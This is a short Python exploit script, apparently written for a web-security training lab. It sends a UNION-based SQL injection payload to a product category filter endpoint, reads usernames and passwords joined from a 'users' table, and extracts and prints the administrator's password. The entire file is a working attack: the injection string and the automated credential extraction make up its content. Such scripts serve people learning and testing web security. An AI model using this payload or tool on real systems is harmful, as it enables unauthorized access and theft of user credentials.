import requests
import urllib3
import sys
import regex as re
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080'}


def exploit_payload(url):
    uri = "/filter?category=Pets"
    payload = "' union select NULL, username || '*' || password from users--"

    r = requests.get(url+uri+payload, verify=False, proxies=proxies)
    res = r.text

    if ("administrator") in res:
        print("[+] Found the username and password")
        soup = BeautifulSoup(r.text, 'html.parser')
        admin_password = soup.find(
            string=re.compile('.*administrator*.')).split('*')[1]

        print(f"[+] Username: administrator Password: {admin_password}")
        return True
    return False


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except:
        print(f"[-] Usage: {sys.argv[0]} <url>")
        print(f"[-] Example: {sys.argv[0]} www.example.com")
        sys.exit(-1)
    print("Dumping the list of username and password")
    if not exploit_payload(url):
        print("[-] SQL Injection Unsuccessful!")
